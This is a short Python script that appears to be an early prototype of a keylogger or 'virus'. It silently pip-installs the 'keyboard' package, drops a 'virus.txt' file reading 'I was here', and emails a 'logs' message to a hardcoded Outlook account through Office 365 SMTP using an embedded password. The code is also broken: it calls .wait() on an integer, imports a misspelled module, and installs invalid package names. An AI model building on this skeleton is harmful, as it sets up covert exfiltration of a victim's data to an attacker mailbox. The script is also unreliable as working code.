from datetime import datetime
import subprocess, sys


process = subprocess.check_call([sys.executable, '-m', 'pip', 'install','keyboard'])
process.wait()
process = subprocess.check_call([sys.executable, '-m', 'pip', 'install','smtplib>'])
process.wait()
process = subprocess.check_call([sys.executable, '-m', 'pip', 'install','MIMEMultipart>'])
process.wait()
process = subprocess.check_call([sys.executable, '-m', 'pip', 'install','MIMEText>'])
process.wait()

from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import stmplib

with open("./virus.txt", "w", encoding="utf-8") as buffer:
    buffer.write(f"I was here at {datetime.now()} ;>")

test = datetime.now()

message = "ok ca marche " + str(test)

EMAIL_ADDRESS = "lovingpython@outlook.com"
EMAIL_PASSWORD = "123456789AZERTYUIOP"

def prepare_mail(message):
    msg = MIMEMultipart("alternative")
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS
    msg["Subject"] = "logs"
    html = f"<p>{message}</p>"
    text_part = MIMEText(message, "plain")
    html_part = MIMEText(html, "html")
    msg.attach(text_part)
    msg.attach(html_part)
    return msg.as_string()

server = smtplib.SMTP(host="smtp.office365.com", port=587)
server.starttls()
server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, prepare_mail(message))
server.quit()
